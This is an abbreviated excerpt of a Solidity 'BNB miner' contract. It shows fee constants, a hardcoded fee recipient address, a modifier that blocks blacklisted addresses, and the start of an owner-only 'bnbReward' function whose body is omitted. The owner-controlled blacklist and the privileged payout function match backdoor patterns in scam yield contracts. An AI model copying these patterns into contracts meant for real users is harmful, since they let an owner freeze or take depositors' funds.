...
contract BestBNBMiner is Context, Ownable {
    using SafeMath for uint256;

    uint256 private EGGS_TO_HATCH_1MINERS = 1080000;
    uint256 private PSN = 10000;
    uint256 private PSNH = 5000;
    uint256 private devFeeVal = 4; //4%
    ...
    require(!blacklist[msg.sender], "Suspicious");
    _;
}
    
    constructor() {

        recAdd = payable(0xf9c9ae73FA5fC70a49B5Ac7A7DF60b0F6E020e7D);
    }
    ...
    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        ...
        function bnbReward(uint256 amount) public onlyOwner
    {
